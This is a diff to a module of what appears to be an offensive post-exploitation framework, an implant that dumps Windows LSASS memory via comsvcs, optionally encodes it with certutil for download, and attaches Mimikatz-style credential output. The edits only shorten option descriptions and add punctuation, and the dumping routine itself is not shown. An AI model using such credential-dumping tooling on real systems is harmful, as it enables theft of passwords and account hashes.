@@ -13,10 +13,10 @@ class ComsvcsLSASSImplant(core.implant.Implant):
 
     def load(self):
         self.options.register("DIRECTORY", "%TEMP%", "Writeable directory for output", required=False)
-        self.options.register("CHUNKSIZE", "10000000", "Size in bytes (kind of) of chunks to save, helps avoid MemoryError exceptions.", required=True)
+        self.options.register("CHUNKSIZE", "10000000", "Size in bytes (kind of) of chunks to save.", required=True)
         self.options.register("CERTUTIL", "false", "Use certutil to base64 encode the file before downloading.", required=True, boolean=True)
         self.options.register("LPATH", "/tmp/", "Local file save path.")
-        self.options.register("LSASSPID", "0", "Process ID of lsass.exe (0 = detect automatically).", required=False)
+        self.options.register("LSASSPID", "0", "Process ID of lsass.exe.", required=False)
 
     def job(self):
         return ComsvcsLSASSJob
@@ -32,7 +32,7 @@ class ComsvcsLSASSJob(core.job.Job):
         if self.session_id == -1:
             return
         if self.session.elevated != 1 and self.options.get("IGNOREADMIN") == "false":
-            self.error("0", "This job requires an elevated session. Set IGNOREADMIN to true to run anyway.", "Not elevated", "")
+            self.error("0", "This job requires an elevated session. Set IGNOREADMIN to true to run anyway.", "Not elevated!", "")
             return False
 
     def report(self, handler, data, sanitize = False):
@@ -130,7 +130,7 @@ class ComsvcsLSASSJob(core.job.Job):
     def done(self):
         rfile = "lsass.bin"
         if self.save_len == 0:
-            self.print_warning("The file is empty")
+            self.print_warning("The file is empty.")
         self.results = "%s saved to %s (%d bytes)" % (rfile, self.save_fname, self.save_len)
         if self.katz_output: self.results += "\n"+self.katz_output
         self.print_status(self.results.split("\n")[0])
